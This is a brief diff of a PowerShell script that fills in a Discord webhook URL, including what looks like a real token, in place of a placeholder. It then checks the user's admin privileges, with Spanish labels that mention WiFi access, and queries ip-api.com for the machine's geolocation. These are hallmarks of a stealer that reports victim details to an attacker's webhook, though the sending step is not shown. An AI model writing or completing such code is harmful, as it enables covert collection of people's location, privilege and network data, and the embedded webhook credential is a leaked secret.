@@ -1,5 +1,5 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$webhook = 'WEBHOOK_HERE'
+$webhook = 'https://discord.com/api/webhooks/1504878721935474779/b4dgmFw2ay7hINlZBiWp-u7oRXXpftFk-umegXkwgmabQCg8l-avauoyk78OlQBZOmmW'
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $privilegios = if ($isAdmin) { "ADMINISTRADOR (Acceso Total)" } else { "ESTANDAR (Acceso Limitado a WiFi)" }
 $geo = Invoke-RestMethod -Uri 'http://ip-api.com/json' -UseBasicParsing
